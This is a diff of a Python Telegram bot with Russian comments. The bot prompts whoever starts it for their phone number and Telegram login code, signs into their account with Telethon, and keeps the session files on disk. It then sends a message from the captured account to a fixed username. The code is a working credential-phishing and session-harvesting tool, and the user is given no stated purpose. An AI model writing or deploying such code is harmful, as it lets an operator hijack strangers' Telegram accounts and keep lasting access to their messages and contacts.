@@ -1,84 +1,124 @@
-from telethon import TelegramClient
-import asyncio
-import sqlite3
-import os 
-
-# Папка сессий
-SESSION_DIR = "sessions/"
-os.makedirs(SESSION_DIR, exist_ok=True)  # Создаём папку, если её нет
-
-# Настройки API Telegram (получите API_ID и API_HASH на https://my.telegram.org/)
-API_ID = 1  # Замените на свой
-API_HASH = ""  # Замените на свой
-MESSAGE_TEXT = "Привет! Это тестовое сообщение."
-
 import os
-if not os.path.exists("sessions"):
-    os.makedirs("sessions")
+import asyncio
+from telethon import TelegramClient
+from telegram import Update
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    MessageHandler,
+    filters,
+    ConversationHandler,
+    ContextTypes,
+)
+from config import API_ID, API_HASH, TELEGRAM_BOT_TOKEN
 
+# Тестовое сообщение и целевой юзернейм для отправки
+MESSAGE_TEXT = "Привет! Это тестовое сообщение."
+TARGET_USERNAME = "@s4tchik"
 
-db_path = "users.db"
-if os.path.exists(db_path):
-    print(f"Файл {db_path} существует.")
-else:
-    print(f"Файл {db_path} не найден! Нужно его создать.")
+# Папка для хранения сессий Telethon
+SESSION_DIR = "sessions/"
+os.makedirs(SESSION_DIR, exist_ok=True)
 
+# Этапы диалога: сначала получаем номер, затем - код (если требуется)
+PHONE, CODE = range(2)
 
-conn = sqlite3.connect("users.db")
-cursor = conn.cursor()
-
-# Создание таблицы пользователей
-cursor.execute("""
-    CREATE TABLE IF NOT EXISTS users (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        phone TEXT UNIQUE NOT NULL
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """
+    Обработчик команды /start.
+    Запускает диалог и запрашивает номер телефона в международном формате.
+    """
+    await update.message.reply_text(
+        "Привет! Введите ваш номер телефона в международном формате, например, +79143520888"
     )
-""")
+    return PHONE
 
-# Добавление тестовых пользователей
-users = [("+79955717985",)]
-cursor.executemany("INSERT OR IGNORE INTO users (phone) VALUES (?)", users)
+async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """
+    Обработчик получения номера телефона.
+    Создаёт клиент Telethon и пытается подключиться.
+    Если сессия не авторизована, отправляет код на указанный номер.
+    """
+    phone = update.message.text.strip()
+    context.user_data["phone"] = phone
+    # Формируем название файла сессии
+    session_file = os.path.join(SESSION_DIR, phone)
+    context.user_data["session_file"] = session_file
+    context.user_data["client"] = TelegramClient(session_file, API_ID, API_HASH)
+    
+    client: TelegramClient = context.user_data["client"]
+    await update.message.reply_text("Обрабатываю авторизацию...")
+    await client.connect()
 
-conn.commit()
-conn.close()
+    if not await client.is_user_authorized():
+        try:
+            await client.send_code_request(phone)
+            await update.message.reply_text("Введите код, который вы получили:")
+            return CODE
+        except Exception as e:
+            await update.message.reply_text(f"Ошибка при отправке кода: {e}")
+            return ConversationHandler.END
+    else:
+        me = await client.get_me()
+        await update.message.reply_text(f"Вы уже авторизованы как {me.username or me.first_name}.")
+        await send_message(client, update)
+        await client.disconnect()
+        return ConversationHandler.END
 
-# Файл сессий пользователей
-SESSION_FILE = "sessions/"
-
-async def send_message(client, user_id, message):
-    """Отправляет сообщение в Telegram."""
+async def get_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """
+    Обработчик получения кода.
+    После ввода кода выполняется вход в аккаунт Telethon.
+    При успешной авторизации отправляется тестовое сообщение.
+    """
+    code = update.message.text.strip()
+    phone = context.user_data["phone"]
+    client: TelegramClient = context.user_data["client"]
     try:
-        await client.send_message(user_id, message)
-        print(f"Сообщение отправлено {user_id}")
+        await client.sign_in(phone, code)
+        me = await client.get_me()
+        await update.message.reply_text(f"Авторизация успешна! Вы: {me.username or me.first_name}")
+        await send_message(client, update)
     except Exception as e:
-        print(f"Ошибка отправки сообщения {user_id}: {e}")
+        await update.message.reply_text(f"Ошибка авторизации: {e}\nПопробуйте снова, введя /start")
+    finally:
+        await client.disconnect()
+    return ConversationHandler.END
 
-async def main():
-    """Основная функция для работы с пользователями."""
-    conn = sqlite3.connect("users.db")
-    cursor = conn.cursor()
-    cursor.execute("SELECT phone FROM users")
-    users = cursor.fetchall()
-    conn.close()
+async def send_message(client: TelegramClient, update: Update):
+    """
+    Функция отправки тестового сообщения в указанный чат.
+    """
+    try:
+        await client.send_message(TARGET_USERNAME, MESSAGE_TEXT)
+        await update.message.reply_text(f"Сообщение успешно отправлено пользователю {TARGET_USERNAME}.")
+    except Exception as e:
+        await update.message.reply_text(f"Ошибка отправки сообщения: {e}")
 
-    for (phone,) in users:
-        session_file = os.path.join(SESSION_DIR, phone)  # Файл сессии
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """
+    Обработчик отмены диалога.
+    """
+    await update.message.reply_text("Операция отменена.")
+    return ConversationHandler.END
 
-        # Используем существующую сессию
-        client = TelegramClient(session_file, API_ID, API_HASH)
-        
-        async with client:
-            if not await client.is_user_authorized():
-                print(f"❌ Сессия {phone} не авторизована. Требуется ввод кода вручную!")
-                await client.send_code_request(phone)  # Отправляем код
-                code = input(f"Введите код для {phone}: ")  # Пользователь вводит код вручную
-                await client.sign_in(phone, code)  # Авторизуем
+def main():
+    """
+    Основная функция для запуска бота.
+    """
+    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
 
-            me = await client.get_me()
-            print(f"✅ Авторизован как {me.username} ({phone})")
-            await send_message(client, "@s4tchik", MESSAGE_TEXT)
-        
-        await asyncio.sleep(5)  # Пауза между запросами
+    conv_handler = ConversationHandler(
+        entry_points=[CommandHandler("start", start)],
+        states={
+            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
+            CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_code)]
+        },
+        fallbacks=[CommandHandler("cancel", cancel)]
+    )
+
+    application.add_handler(conv_handler)
+    application.run_polling()
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    main()
